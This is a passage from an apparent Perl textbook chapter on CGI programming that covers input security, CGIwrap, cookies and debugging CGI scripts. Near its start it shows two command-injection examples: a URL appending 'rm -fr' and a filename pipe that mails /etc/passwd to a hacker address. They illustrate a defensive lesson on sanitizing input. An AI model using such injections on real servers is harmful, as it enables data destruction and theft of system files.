http://www.foo.com/cgi-bin/dirlist.pl/; rm -fr;

</pre>

</blockquote>

<p>

Now, all of a sudden, you are faced with the possibility of files

being deleted because the semi-colon (;) lets multiple commands

be executed on one command line.

<p>

This same type of security hole is possible any time you try to

run an external command. You might be tempted to use the <tt>mail</tt>,

<tt>sendmail</tt>, or <tt>grep</tt>

commands to save time while writing your CGI program, but because

all of these programs are easily duplicated using Perl, try to

resist the temptation.

<p>

Another security hole is related to using external data to open

or create files. Some enterprising hacker could use <tt>&quot;|

mail hacker@hacker.com &lt; /etc/passwd&quot;</tt> as the

filename to mail your password file or any other file to himself.

<p>

All of these security holes can be avoided by removing the dangerous

characters (like the | or pipe character).

<p>

<img SRC="pseudo.gif" tppabs="http://202.113.16.101/%7eeb%7e/Perl%205%20By%20Example/pseudo.gif" BORDER="1" ALIGN="RIGHT" WIDTH="31" HEIGHT="34"><p>

<blockquote>

<i>Define the </i><tt><i>improveSecurity()</i></tt><i>

fuNCtion.<br>

Copy the passed string into </i><tt><i>$_</i></tt><i>,

the default search space.<br>

Protect against command-line options by removing </i><tt><i>-</i></tt><i>

and </i><tt><i>+</i></tt><i> characters.

<br>

Additional protection against command-line options.<br>

Convert all dangerous characters into harmless underscores.<br>

Return the </i><tt><i>$_</i></tt><i>

variable.</i>

</blockquote>

<p>

Listing 19.3 shows how to remove dangerous characters.

<hr>

<blockquote>

<b>Listing 19.3&nbsp;&nbsp;19LST03.PL-How to Remove Dangerous

Characters<br>

</b>

</blockquote>

<blockquote>

<pre>

sub improveSecurity {

    $_ = shift;

    s/\-+(.*)/\1/g;

    s/(.*)[ \t]+\-(.*)/\1\2/g;

    tr/\$\'\`\&quot;\&lt;\&gt;\/\;\!\|/_/;

    return($_);

}

</pre>

</blockquote>

<hr>

<h2><a NAME="CGIwrapandSecurity"><font SIZE="5" COLOR="#FF0000">

CGIwrap and Security</font></a></h2>

<p>

CGIwrap (<b>http://wwwcgi.umr.edu/~cgiwrap/</b>) is a UNIX-based

utility written by Nathan Neulinger that lets general users run

CGI scripts without needing access to the server's <tt>cgi-bin</tt>

directory. Normally, all scripts must be located in the server's

main <tt>cgi-bin</tt> directory and

all run with the same UID (user ID) as the Web server. CGIwrap

performs various security checks on the scripts before changing

ID to match the owner of the script. All scripts are executed

with same the user ID as the user who owns them. CGIwrap works

with NCSA, Apache, CERN, Netsite, and probably any other UNIX

Web server.

<p>

Any files created by a CGI program are normally owned by the Web

server. This can cause a problem if you need to edit or remove

files created by CGI programs. You might have to ask the system

administrator for help because you lack the proper auhorization.

All CGI programs have the same system permissions as the Web server.

If you run your Web server under the root user ID-being either

very brave or very foolish-a CGI program could be tricked into

erasing the entire hard drive. CGIwrap provides a way around these

problems.

<p>

With CGIwrap, scripts are located in users' <tt>public_html/cgi-bin</tt>

directory and run under their user ID. This means that any files

the CGI program creates are owned by the same user. Damage caused

by any security bugs you may have introduced-via the CGI program-will

be limited to your own set of directories.

<p>

In addition to this security advantage, CGIwrap is also an excellent

debugging tool. When CGIwrap is installed, it is copied to <tt>cgiwrapd</tt>,

which can be used to view output of failing CGIs.

<p>

You can install CGIwrap by following these steps:

<ol>

<li>Obtain the source from the <b>http://www.umr.edu/~cgiwrap/download.html</b>

Web page.

<li>Ensure that you have root access.

<li>Unpack and run the Configure script.

<li>Type <b>make</b>.

<li>With a user ID of root, copy the <tt>cgiwrap</tt>

executable to your server's <tt>cgi-bin</tt>

directory.

<li>Make sure that <tt>cgiwrap</tt>

is owned by root and executable by all users by typing <b>chown

root cgiwrap; chmod 4755 cgiwrap</b>. The <tt>cgiwrap</tt>

executabe must also be set UID.

<li>In order to gain the debugging advantages of CGIwrap, create

symbolic links to <tt>cgiwrap</tt>

called <tt>cgiwrapd</tt>, <tt>nph-cgiwrap</tt>,

and <tt>nph-cgiwrapd</tt>. The first

symbolic link can be created by typing <b>ln -s cgiwrap cgiwrapd</b>.

The others are created using similar commands.

</ol>

<p>

<p>

<center>

<table BORDERCOLOR="#000000" BORDER="1" WIDTH="80%">

<tr><td><b>Tip</b></td></tr>

<tr><td>

<blockquote>

You can find additional information at the <tt><b><font FACE="Courier">http://www.umr.edu/<b>~cgiwrap/install.html</b></font></b></tt> web site.

</blockquote>



</td></tr>

</table>

</center>

<p>

<p>

CGIs that run using CGIwrap are stored in a <tt>cgi-bin</tt>

directory under an individual user's public Web directory and

called like this:

<blockquote>

<pre>

http://servername/cgi-bin/cgiwrap/~userid/scriptname

</pre>

</blockquote>

<p>

To debug a script run via cgiwrap, add the letter &quot;d&quot;

to <tt>cgiwrap</tt>:

<blockquote>

<pre>

http://servername/cgi-bin/cgiwrapd/~userid/scriptname

</pre>

</blockquote>

<p>

When you use CGIwrap to debug your CGI programs, quite a lot of

information will be displayed in the Web browser's window. For

example, if you called a CGI program with the following URL:

<blockquote>

<pre>

http://www.engr.iupui.edu/cgi-bin/cgiwrapd/~dbewley/cookie-test.pl

</pre>

</blockquote>

<p>

The output might look like this:

<blockquote>

<pre>

Redirecting STDERR to STDOUT

Setting Limits (CPU)

Environment Variables:

   QUERY_STRING: ''

   PATH_INFO: '/~dbewley/cookie-test.pl'

   REMOTE_HOST: 'x2s5p10.dialin.iupui.edu'

   REMOTE_ADDR: '134.68.249.69'

   SCRIPT_NAME: '/cgi-bin/cgiwrapd'

Trying to extract user/script from PATH_INFO

Extracted Data:

   User:  'dbewley'

   Script:  'cookie-test.pl'

Stripping user and script data from PATH_INFO env. var.

Adding user and script to SCRIPT_NAME env. var.

Modified Environment Variables:

   PATH_INFO: ''

   SCRIPT_NAME: '/cgi-bin/cgiwrapd/dbewley/cookie-test.pl'

Sanitize user name: 'dbewley'-'dbewley'

Sanitize script name: 'cookie-test.pl'-'cookie-test.pl'

Log Request

   Opening log file.

   Writing log entry.

   Closing log file.

   Done logging request.

User Data Retrieved:

   UserName: 'dbewley'

   UID: '8670'

   GID: '200'

   Directory: '/home/stu/d/dbewley'

UIDs/GIDs Changed To:

   RUID: '8670'

   EUID: '8670'

   RGID: '200'

   EGID: '200'

Current Directory:  '/sparcus/users/dbewley/www/cgi-bin'

Results of stat:

   File Owner: '8670'

   File Group: '200'

   Exec String:  './cookie-test.pl'

Output of script follows:

=====================================================

Set-Cookie: user=dbewley; expires=Wednesday, 09-Nov-99 00:00:00 GMT;

path=/cgi-bin/; domain=.engr.iupui.edu; 

Set-Cookie: flag=black; expires=Wednesday, 09-Nov-99 00:00:00 GMT; path=/

cgi-bin/; domain=.iupui.edu; 

Set-Cookie: car=honda:accord:88:LXI:green; expires=Wednesday, 09-Nov-99

00:00:00 GMT; path=/cgi-bin/; domain=.engr.iupui.edu; 

Content-type: text/html

Cookies:&lt;BR&gt;

flag = black&lt;br&gt;

car = honda:accord:88:LXI:green&lt;br&gt;

user = dbewley&lt;br&gt;

</pre>

</blockquote>

<p>

This output can be invaluable if your script is dying because

of a syntax error before it can print an HTTP header to the browser.

<br>

<p>

<center>

<table BORDERCOLOR="#000000" BORDER="1" WIDTH="80%">

<tr><td><b>Note</b></td></tr>

<tr><td>

<blockquote>

If you'd like a more in-depth description of CGI Security, visit these Web sites:</blockquote>



</td></tr>

</table>

</center>

<p>

<blockquote>

<pre>

http://www.csclub.uwaterloo.ca/u/mlvanbie/cgisec/# CGI Security Tutorial

http://www.umr.edu/</font><font SIZE="1" FACE="Courier">~</font><font SIZE="2" FACE="Courier">cgiwrap/   # CGIwrap Home Page

</pre>

</blockquote>

<h2><a NAME="Cookies"><font SIZE="5" COLOR="#FF0000">

Cookies</font></a></h2>

<p>

Most Webmasters want to track the progress of a user from page

to page as they click about the site. Unfortunately, HTTP is a

<i>stateless</i> protocol. Stateless protocols have no memory;

they only understand the current command. This makes tracking

a visitor through a site difficult at best. A user could visit

a site, leave, and come back a day or a minute later, possibly

from a different IP address. The site maintainer has no way of

knowing if this is the same browser or not.

<p>

One answer to this dilemma is to use <i>cookies</i> in your CGI

programs. Cookies can provide a way to maintain information from

one HTTP request to the next-remember the coNCept of persistent

information?

<p>

A cookie is a small chunk of data, stored on the visitor's local

hard drive by the Web server. It can be used to track your path

through a Web site and develop a visitor's profile for marketing

or informational purposes. Cookies can also be used to hold information

like account numbers and purchase decisions so that shopping applications

can be created.

<h3><a NAME="CookieSecurity">

Cookie Security</a></h3>

<p>

There has been some controversy about whether cookies are secure.

Although the cookie mechanism provides a way for a Web server

to write data to your hard disk the limitations are very strict.

A client may only hold a maximum of 300 cookies at a time and

a single server may only give 20 cookies to it.  Cookies can only

be 4 kilobytes each, iNCluding the name and data, so, at most,

a visitor's hard disk may have 1.2 megabytes of hard disk being

used to store cookies. In addition, cookie data may only be written

to one file, usually called <tt>cookies.txt</tt>.

<p>

During a browsing session, Netscape stores cookies in memory,

but when the browser is exited, cookies are written into a file

called <tt>cookies.txt</tt>. On the

Macintosh, the cookie jar is in a file called <tt>MagicCookie</tt>

in the prefereNCes folder. The cookie file contains plain text

as shown in Listing 19.3.

<h3><a NAME="HowAreCookiesCreatedandRead">

How Are Cookies Created and Read?</a></h3>

<p>

Cookies are set using a <tt>Set-cookie</tt>:

HTTP header with five possible fields separated with a semicolon

and a space. These fields are:

<ul>

<li><b>cookie-name=cookie-value;</b>-name of the cookie and its

value. The name and the value combined must be less than 4 kilobytes

in length.

<li><b>expiration=expiration-date;</b>-the date the cookie will

be deleted from the cookie file. You can delete a previously set

cookie ahead of schedule by creating a second cookie with the

same name, path, and domain, but with an expiration date in the

past.

<li><b>path=cookie-path;</b>-combines with the domain name to

determine when a browser should show a cookie to the server.

<li><b>domain=server-domain;</b>-used to determine when a browser

should show a cookie to the server. Usually, cookies are created

with the Web server's name without the <tt>www</tt>.

For example, <tt>.foo.net</tt> instead

of <tt>www.foo.net</tt>. Notice that

the leading period is retained.

<li><b>secure</b>-ensures that the cookie will be sent back only

to the server when a secure HTTP connection has been established.

</ul>

<p>

When all of these elements are put together, they look like this:

<blockquote>

<pre>

Set-Cookie: user_addr=ppp1.dialin.iupui.edu;

expires=Wednesday, 09-Nov-99 00:00:00 GMT; path=/cgi-bin/;

domain=.engr.iupui.edu; secure

</pre>

</blockquote>

<p>

Listing 19.4 contains a program that both sets and read cookies.

First, it will create four cookies and then it will read those

cookies from the <tt>HTTP_COOKIE</tt>

environment variable. Inside the <tt>HTTP_COOKIE</tt>

environment variable, the cookies are delimited by a semicolon

and a space. The cookie fields are separated by commas, and the

name-value pairs are separated by equal signs. In order to use

cookies, you need to parse the <tt>HTTP_COOKIE</tt>

variable at three different levels.

<p>

<img SRC="pseudo.gif" tppabs="http://202.113.16.101/%7eeb%7e/Perl%205%20By%20Example/pseudo.gif" BORDER="1" ALIGN="RIGHT" WIDTH="31" HEIGHT="34"><p>

<blockquote>

<i>Turn on the warning option.<br>

Turn on the strict pragma.<br>

Declare a variable to hold the expiration date and time of the

cookies.<br>

Declare a variable to hold the domain name.<br>

Declare a variable to hold the path name.<br>

Set four cookies with different values.<br>

Read those four cookies from the environment; place them into

</i><tt><i>%cookies</i></tt><i>.<br>

Start the HTML Web page.<br>

Display a text heading on the Web page.<br>

Start an HTML table.<br>

Display each cookie in a table row.<br>

End the table.<br>

End the Web page.<br>

Define the </i><tt><i>setCookie()</i></tt><i>

fuNCtion.<br>

Create local variables from the parameter array.<br>

Send the </i><tt><i>Set-Cookie:</i></tt><i>

HTTP header to the Web browser.<br>

Send the secure option only if requested.<br>

End the header with a newline.<br>

Define the </i><tt><i>getCookies()</i></tt><i>

fuNCtion.<br>

Create a local hash to hold the cookies.<br>

Iterate over an array created by splitting the </i><tt><i>HTTP_COOKIE</i></tt><i>

environment<br>

variable based on the &quot;;&quot; character sequeNCe.<br>

Split off the name of the cookie.<br>

Create a hash entry with the cookie's name as the key and the

rest of the cookie as the entry's value.<br>

Return the hash.</i>

</blockquote>

<hr>

<blockquote>

<b>Listing 19.4&nbsp;&nbsp;19LST04.PL-How to Set and Retrieve

Cookies<br>

</b>

</blockquote>

<blockquote>

<pre>

#!/usr/local/bin/perl -w

use strict;



my($expDate)   = &quot;Wednesday, 09-Nov-99 00:00:00 GMT&quot;;

my($theDomain) = &quot;.engr.iupui.edu&quot;;

my($path)      = &quot;/cgi-bin/&quot;;



setCookie(&quot;user&quot;, &quot;dbewley&quot;, $expDate, $path, $theDomain);



setCookie(&quot;user_addr&quot;, $ENV{'REMOTE_HOST'}, $expDate, $path, $theDomain)

    if defined($ENV{'REMOTE_HOST'});



setCookie(&quot;flag&quot;, &quot;black&quot;, $expDate, $path, &quot;.iupui.edu&quot;);

setCookie(&quot;car&quot;, &quot;honda:accord:88:LXI:green&quot;, $expDate, $path, 

$theDomain);



my(%cookies) = getCookies();



print(&quot;Content-type: text/html\n\n&quot;);

print(&quot;&lt;HTML&gt;&quot;);

print(&quot;&lt;HEAD&gt;&lt;TITLE&gt;The Cookie Display&lt;/TITLE&gt;&lt;/HEAD&gt;&quot;);

print(&quot;&lt;BODY&gt;&quot;);

print(&quot;&lt;H1&gt;Cookies&lt;/H1&gt;&quot;);

print(&quot;&lt;TABLE BORDER=1 CELLPADDING=10&gt;&quot;);

foreach (sort(keys(%cookies))) {

    print(&quot;&lt;TR&gt;&lt;TD&gt;$_&lt;/TD&gt;&lt;TD&gt;$cookies{$_}&lt;/TD&gt;&lt;/TR&gt;&quot;);

}

print(&quot;&lt;/TABLE&gt;&quot;);

print(&quot;&lt;/BODY&gt;&quot;);

print(&quot;&lt;/HTML&gt;&quot;);





sub setCookie {

    my($name, $val, $exp, $path, $dom, $secure) = @_;



    print(&quot;Set-Cookie: &quot;);

    print(&quot;$name=$val, expires=$exp, path=$path, domain=$dom&quot;);

    print(&quot;, $secure&quot;) if defined($secure);

    print(&quot;\n&quot;);

}



sub getCookies {

    my(%cookies);



    foreach (split (/; /,$ENV{'HTTP_COOKIE'})){

        my($key) = split(/=/, $_);



        $cookies{$key} = substr($_, index($_, &quot;=&quot;)+1);

    } 

    return(%cookies);

}

</pre>

</blockquote>

<hr>

<p>

This program shows that the Web server stores a copy of any cookies

that you set into the <tt>HTTP_COOKIE</tt>

environment variable. It only performs one level of parsing. In

order to create a really useful <tt>getCookies()</tt>

fuNCtion, you need to split the cookie on the comma character

and then again on the equals character.

<h3><a NAME="CanaVisitorsBrowserSupportCookies">

Can a Visitor's Browser Support Cookies?</a></h3>

<p>

One difficulty that you may have in using cookies is that not

every browser can support them. If you are using cookies, you

need a user-friendly way of telling a visitor that the feature

he or she is  trying to use is not available to him or her.

<p>

Listing 19.5 contains a script that shows you a nice way of automatically

determining if a visitor's Web browser supports cookies. The CGI

program will set a cookie and then redirect the visitor's Web

browser back to itself with some additional path information.

When the script (during its second invocation) sees the extra

path information, it checks for the previously created cookie.

If it exists, the visitor's browser has passed the test. Otherwise,

the visitor's browser does not support cookies.

<p>

<img SRC="pseudo.gif" tppabs="http://202.113.16.101/%7eeb%7e/Perl%205%20By%20Example/pseudo.gif" BORDER="1" ALIGN="RIGHT" WIDTH="31" HEIGHT="34"><p>

<blockquote>

<i>Turn on the warning option.<br>

<i>Turn on the strict pragma.<br>

<i>If there is no query information, then set a cookie and reload

the script.<br>

<i>Otherwise, see if the cookie set before the reload exits.<br>

<i>If the cookie exists, the browser supports cookies.<br>

<i>If the cookie does not exist, the browser does not support

cookies.</i></i></i></i></i></i>

</blockquote>

<hr>

<blockquote>

<b>Listing 19.5&nbsp;&nbsp;19LST05.PL-How to Tell Whether  the

Visitor's Browser Supports Cookies<br>

</b>

</blockquote>

<blockquote>

<pre>

#!/usr/bin/perl -w

use strict;



if ($ENV{'QUERY_STRING'} ne 'TESTING') {

    print &quot;HTTP/1.0 302 Moved Temporarily\n&quot;; 

    print &quot;Set-Cookie: Cookie=Test\n&quot;;

    print &quot;Location: $ENV{'SCRIPT_NAME'}?TESTING\n\n&quot;;

}

else {

    if ($ENV{'HTTP_COOKIE'} =~ /Cookie=Test/) {

        print(&quot;Content-type: text/html\n\n&quot;);

        print(&quot;&lt;HTML&gt;&quot;);

        print(&quot;&lt;HEAD&gt;&lt;TITLE&gt;$ENV{'HTTP_USER_AGENT'} supports Cookies

&lt;/TITLE&gt;&lt;/HEAD&gt;&quot;);

        print(&quot;&lt;BODY&gt;&quot;);

        print(&quot;Your browser, $ENV{'HTTP_USER_AGENT'}, supports the

Netscape HTTP &quot;);

        print(&quot;Cookie Specification.&quot;);

        print(&quot;&lt;/BODY&gt;&lt;/HTML&gt;&quot;);

    }

    else {

        print(&quot;Content-type: text/html\n\n&quot;);

        print(&quot;&lt;HTML&gt;&quot;);

        print(&quot;&lt;HEAD&gt;&lt;TITLE&gt;$ENV{'HTTP_USER_AGENT'} doesn't support

Cookies&lt;/TITLE&gt;&lt;/HEAD&gt;&quot;);

        print(&quot;&lt;BODY&gt;&quot;);

        print(&quot;Your browser, $ENV{'HTTP_USER_AGENT'}, doesn't appear to

support cookies.&quot;);

        print(&quot;Cookie Specification.&quot;);

        print(&quot;&lt;/BODY&gt;&lt;/HTML&gt;&quot;);

    }

}

</pre>

</blockquote>

<hr>

<p>

<center>

<table BORDERCOLOR="#000000" BORDER="1" WIDTH="80%">

<tr><td><b>Note</b></td></tr>

<tr><tdz>

<blockquote>

You can find more information about cookies at these Web sites:</blockquote>

<blockquote>

<tt>http://home.netscape.com/newsref/std/cookie_spec.html<br>

http://www.netscapeworld.com/netscapeworld/nw-07-1996/nw-07-cookies.html<br>

http://www.emf.net/~mal/cookiesinfo.html<br>

http://ds.internic.net/internet-drafts/draft-ietf-http-state-mgmt-03.txt<br>

http://www.illuminatus.com/cookie/<br>

http://www.jasmin.com/cook0696.html<br>

http://www.bravado.net/rodgers/InterNetNews.html</tt>

</blockquote>



</td></tr>

</table>

</center>

<p>

<h2><a NAME="DebuggingCGIPrograms"><font SIZE="5" COLOR="#FF0000">

Debugging CGI Programs</font></a></h2>

<p>

One of the main reasons to use CGI programs is to generate HTML

documents. When something goes wrong, the common error message

will be 500 Server Error. This message can be caused by several

things. For example, the #! comment at the top of your script

could be invalid, the first line of output was an invalid HTTP

header, there might not be a blank line after the HTTP header,

or you could simply have a syntax error.

<h3><a NAME="SendingOutputtotheServersLogFile">

Sending Output to the Server's Log File</a></h3>

<p>

When your CGI program starts, the <tt>STDERR

</tt>file handle is connected to the server's error log.

You can use <tt>STDERR </tt>to save

status messages that you don't want the user to see. The advantage

of using <tt>STDERR </tt>is that you

don't need to open or close a file. In addition, you'll always

know where the messages are. This is important if you're working

on a team.

<p>

<img SRC="pseudo.gif" tppabs="http://202.113.16.101/%7eeb%7e/Perl%205%20By%20Example/pseudo.gif" BORDER="1" ALIGN="RIGHT" WIDTH="31" HEIGHT="34"><p>

<blockquote>

<i>Send the HTTP header indicating a plain text document.<br>

Send a line of text.<br>

Call the </i><tt><i>logError()</i></tt><i>

fuNCtion to send a message to the server's log file.<br>

Send a line of text.<br>

Define the </i><tt><i>logError()</i></tt><i>

fuNCtion<br>

Declare a local variable to hold the message.<br>

Print the message to </i><tt><i>STDERR </i></tt><i>with

a timestamp.<br>

Define the </i><tt><i>timeStamp()</i></tt><i>

fuNCtion.<br>

Declare some local variables to hold the current date and time.

<br>

Call the </i><tt><i>zeroFill()</i></tt><i>

fuNCtion to format the numbers.<br>

Return a formatted string holding the current date and time.<br>

Define the </i><tt><i>zeroFill()</i></tt><i>

fuNCtion-turns &quot;1&quot; into &quot;01.&quot;<br>

Declare a local variable to hold the number to be filled.<br>

Declare a local variable to hold the string length that is needed.

<br>

Find differeNCe between current string length and needed length.

<br>

If the string is big enough (like &quot;12&quot;), then return

it.<br>

If the string is too big, prefix it with some zeroes.</i>

</blockquote>

<hr>

<blockquote>

<b>Listing 19.6&nbsp;&nbsp;19LST06.PL-Sending Messages to the

Server's Error Log<br>

</b>

</blockquote>

<blockquote>

<pre>

print(&quot;Content-type: text/plain\n\n&quot;);

print(&quot;This is line one.\n&quot;);

logError(&quot;GOOD Status\n&quot;);

logError(&quot;BAD  Status\n&quot;);

print(&quot;This is line two.\n&quot;); 



sub logError {

    my($msg) = shift;

    print STDERR (timeStamp(), &quot; $msg&quot;);

}



sub timeStamp {

    my($sec, $min, $hour, $mday, $mon, $year) = (localtime(time))[0..5];

    $mon  = zeroFill($mon, 2);

    $hour = zeroFill($hour, 2);

    $min  = zeroFill($min, 2);

    $sec  = zeroFill($sec, 2);

    return(&quot;$mon/$mday/$year, $hour:$min:sec&quot;);

}



sub zeroFill {

    my($temp) = shift;

    my($len)  = shift;

    my($diff) = $len - length($temp);



    return($temp) if $diff &lt;= 0;

    return(('0' x $diff) . $temp);

}

</pre>

</blockquote>

<hr>

<p>

<center>

<table BORDERCOLOR="#000000" BORDER="1" WIDTH="80%">

<tr><td><b>Caution</b></td></tr>

<tr><td>

<blockquote>

According to the CGI specifications, the <tt>STDERR</tt> file handle should be connected to the server's error log. However, I found that this was not true when using Windows 95 and O'Reilly's Website server software. There may be other combinations of 
operating systems and server software that also fail to connect <tt>STDERR</tt> to the error log.

</blockquote>



</td></tr>

</table>

</center>

<h3><a NAME="SendingSTDERRtotheWebBrowser">

Sending STDERR to the Web Browser</a></h3>

<p>

If you want your users to see the error messages your script generates,

use the <tt>open()</tt> fuNCtion to

redirect <tt>STDERR</tt> to <tt>STDOUT</tt>

like this:

<blockquote>

<pre>

open(STDERR, &quot;&gt;&amp;STDOUT&quot;);

</pre>

</blockquote>

<p>

After that statement is executed, the output of all print statements

that use the STDERR file handle will be displayed in the Web browser

window.

<p>

You need to be a little careful when using this ability. Your

normal error messages will not have the HTML tags required to

make them display properly.

<h3><a NAME="CGITap">

CGITap</a></h3>

<p>

CGITap (<b>http://scendtek.com/cgitap/</b>) is a CGI debugging

aid that can help pinpoint the problem in a troubling CGI application.

CGITap installs in the <tt>cgi-bin</tt>

directory and runs any CGI programs in &quot;tap mode.&quot; Tap

mode runs the CGI program as normal; however, the output contains

additional diagnostic and environment information. This information

can greatly speed up the process of debugging your CGI scripts.

<p>

CGITap may be installed in any CGI enabled directory and requires

perl4.036 or later. You can install CGITap by following these

steps:

<ol>

<li>Download the CGITap script from the <b>http://scendtek.com/cgitap/</b>

Web page.

<li>Install CGITap in a CGI enabled directory-typically named

cgi-bin.

<li>As with any Perl script, be sure the first line of CGITap

contains the correct path to your system's Perl interpreter. You

should be familiar with the location. If not, try typing <b>which

perl</b> on the UNIX command line.

<li>Check the file permissions to ensure that CGITap is executable.CGITap

has two methods of debugging. The first is adequate for simple

CGI applications that do not use HTML forms for input. The second

method is used for CGI programs that process HTML form information.

</ol>

<p>

For simple CGIs, add <tt>cgitap</tt>

to the URL. For example, normally a CGI program that just prints

the date is called like this:

<p>

<tt>http://localhost/cgi-bin/date</tt>

<p>

That CGI program might display the following in the browser's

window:

<blockquote>

<pre>

Sun Aug 18 16:07:37 EST 1996

</pre>

</blockquote>

<p>

In order to use CGITap for debugging, use a similar URL but with

<tt>cgitap</tt> inserted.

<blockquote>

<pre>

http://localhost/cgi-bin/cgitap/date

</pre>

</blockquote>

<p>

CGITap will extract your CGI program's name, display the CGI environment

to the browser, perform some checks on the program, then execute

the program and return the actual results (both in HTML source

and the actual document).

<p>

CGI programs that process HTML forms will be discussed in Chapter

20, &quot;Form Processing,&quot; but while I'm talking about CGITap,

let me also mention how to use CGITap with HTML forms. A slightly

more complicated method must be used for debugging complex CGI

scripts that require form processing.

<p>

The URL of a form's action is hard coded (via the ACTION modifier

of the <tt>&lt;FORM&gt;</tt> tag)

and you may not want to change it to iNClude <tt>cgitap</tt>.

To allow CGITap to execute automatically when the form posts to

its normal action URL, you can make use of UNIX symbolic links.

If you are using Windows NT or Windows 95, you must change the

URL in the HTML form. The steps for UNIX platforms are:

<ol>

<li>Move your CGI script to a new script called <tt>yourscript.tap</tt>

by typing <b>mv yourscript yourscript.tap</b>.

<li>Make a symbolic link called <tt>yourscript</tt>

to <tt>cgitap</tt> by typing <b>ln

-s cgitap yourscript.</b>For example, let's assume you have a

CGI script called <tt>mailit</tt>

that processes form input data, mails the information to you,

and returns an HTML page to the Web browser. To debug this script,

move <tt>mailit</tt> to <tt>mailit.tap,</tt>

using the following command:

</ol>

<blockquote>

<pre>

mv mailit mailit.tap

</pre>

</blockquote>

<p>

Then create a link to <tt>cgitap,</tt>

using this command:

<blockquote>

<pre>

ln -s cgitap mailit

</pre>

</blockquote>

<p>

Now, you can fill in the HTML form and submit it as usual.

<p>

This method allows UNIX-based scripts and forms to be debugged

without having to change hard-coded URLs in your HTML documents.

When the form is posted, the results will be the CGITap debugging

information, followed by the normal output of <tt>mailit</tt>.

<h3><a NAME="GeneratinganErrorHTMLPage">

Generating an Error HTML Page</a></h3>

<p>

It is a good idea to isolate all program statements that have

a high probability to generate errors at the beginning of your

program, or, at least, before the HTTP header is sent. This lets

you create HTML response pages that correspond to the specific

error that was eNCountered. Listing 19.7 shows a simple example

of this coNCept. You could expand this example to cover many different

errors that can occur.

<p>

<img SRC="pseudo.gif" tppabs="http://202.113.16.101/%7eeb%7e/Perl%205%20By%20Example/pseudo.gif" BORDER="1" ALIGN="RIGHT" WIDTH="31" HEIGHT="34"><p>

<blockquote>

<i>Try (and fail) to open a file. Call the </i><tt><i>error()</i></tt><i>

fuNCtion.<br>

Define the </i><tt><i>error()</i></tt><i>

fuNCtion.<br>

Declare a local variable to hold the error message string.<br>

Output an HTML page to display the error message.</i>

</blockquote>

<hr>

<blockquote>

<b>Listing 19.7&nbsp;&nbsp;19LST07.PL-Generating an Error Response

Using HTML<br>

</b>

</blockquote>

<blockquote>

<pre>

open(FILE, 'AAAA.AAA') or error(&quot;Could not open file AAAA.AAA&quot;);



sub error {

    my($message) = @_;



    print(&quot;Content-type: text/html\n\n&quot;);

    print(&quot;&lt;HTML&gt;\n&quot;);

    print(&quot;&lt;HEAD&gt;&lt;TITLE&gt;CGI Error&lt;/TITLE&gt;&lt;/HEAD&gt;\n&quot;);

    print(&quot;&lt;H1&gt;Status: 500 An Error Has Occurred&lt;/H1&gt;\n&quot;);

    print(&quot;&lt;HR&gt;\n&quot;);

    print(&quot;$message\n&quot;);

    print(&quot;&lt;/BODY&gt;\n&quot;);

    print(&quot;&lt;/HTML&gt;\n&quot;);

}

</pre>

</blockquote>

<hr>

<p>

I'm sure you agree that error messages that you provide are more

informative than the standard ones.

<h2><a NAME="Summary"><font SIZE="5" COLOR="#FF0000">

Summary</font></a></h2>

<p>

This chapter certainly covered a lot of material. It started by

defining CGI as an interface between Web servers and external

programs. Then, you read why Perl is a great programming language

to use when writing CGI programs. Next, the chapter touched on

CGI applications versus Java applets and how they are complementary

technologies.

<p>

After those introductory comments, the fun started. CGI programs

were shown to be invoked by a URL. The URL could be entered directly

into a Web browser or stored in a Web page as a hypertext link

or the destination for HTML form information.

<p>

Before CGI program can be run under the UNIX operating systems,

their file permissions need to be set correctly. Files have three

types of permissions: read, write, and execute. And there are

three types of users that access files: user, group, and others.

CGI programs must be both readable and executable by others.

<p>

The first line of output of any CGI program must be some type

of HTTP header. The most common header is <tt>Content-type:,</tt>

which basically tells the Web browser what to expect (plain text,

perhaps? Or maybe some HTML). The <tt>Location:</tt>

header redirects the Web browser to another URL. The <tt>Set-cookie:</tt>

header stores a small bit of information on the visitor's local

disk. The last header is <tt>Status:</tt>,

which tells the Web browser that an error has arisen.

<p>

By placing a <tt>/</tt> or <tt>?</tt>

at the end of a URL, information can be passed to the CGI program.

Information after a <tt>/</tt> is

placed into the <tt>PATH_INFO</tt>

environment variable. Information after a <tt>?</tt>

is placed into the <tt>QUERY_STRING</tt>

environment variable.

<p>

Environment variables play a big role in CGI programs. They are

the priNCipal means that Web servers use to provide information.

For example, you can find out the client's IP address using the

<tt>REMOTE_ADDR</tt> variable. And

the <tt>SCRIPT_NAME</tt> variable

contains the name of the current program.

<p>

URL eNCoding is used to prevent characters from being misinterpreted.

For example, the <tt>&lt;</tt> character

is usually eNCoded as <tt>%3C</tt>.

In addition, most spaces are converted into plus signs. Listing

19.1 contains a fuNCtion called <tt>decodeURL()</tt>

that will decode the URL eNCoding.

<p>

One of the biggest security risks happens when a user's data (form

input or extra path information) is exposed to operating system

commands such as <tt>mail</tt> or

<tt>grep</tt>. <b>Never trust user

input!</b> Always suspect the worst. Most hackers spend many hours

looking at manuals and source code to find software weaknesses.

You need to read about Web security in order to protect your site.

<p>

The CGIwrap program offers a way to limit the damage potential

by running CGI program with a user ID that is different from the

Web server's. The programs are running using the user's user ID

so that damage is limited to your home directory.

<p>

Cookies are used to store information on the user's hard drive.

They are a way to create persistent information that lasts from

one visit to the next.

<p>

You can debug CGI programs by sending messages to the server's

log file using the <tt>STDERR </tt>file

handle. Or you could redirect <tt>STDERR

</tt>to <tt>STDOUT </tt>so

that the messages appear in the client Web browser's window. If

you have a complex problem, consider using CGItap, a program that

lets you see all of the environment variables available to your

program.

<p>

The next chapter, &quot;Form Processsing,&quot; will introduce

you to HTML forms and how CGI programs can process form information.

After the introduction, a Guest book application will be presented.

Guest books let visitors leave comments that can be viewed later

by other visitors.

<h2><a NAME="ReviewQuestions"><font SIZE="5" COLOR="#FF0000">

Review Questions</font></a></h2>

<p>

Answers to Review Questions are in Appendix A.

<ol>

<li>Is CGI a programming language?

<li>Are CGI and Java the same type of protocol?

<li>Do CGI program files need to have the write turned on?

<li>What is the first line of output for CGI programs?

<li>What information does the <tt>HTTP_USER_AGENT</tt>

contain?

<li>Why is CGItap a useful program?

</ol>

<h2><a NAME="ReviewExercises"><font SIZE="5" COLOR="#FF0000">

Review Exercises</font></a></h2>

<ol>

<li>Convert the program in Listing 19.1 so that it displays an

HTML document.

<li>Convert the program in Listing 19.1 so that it uses the <tt>Location:</tt>

HTTP header.

<li>Convert the program in Listing 19.1 so that it displays all

environment variables. Hint: <tt>foreach

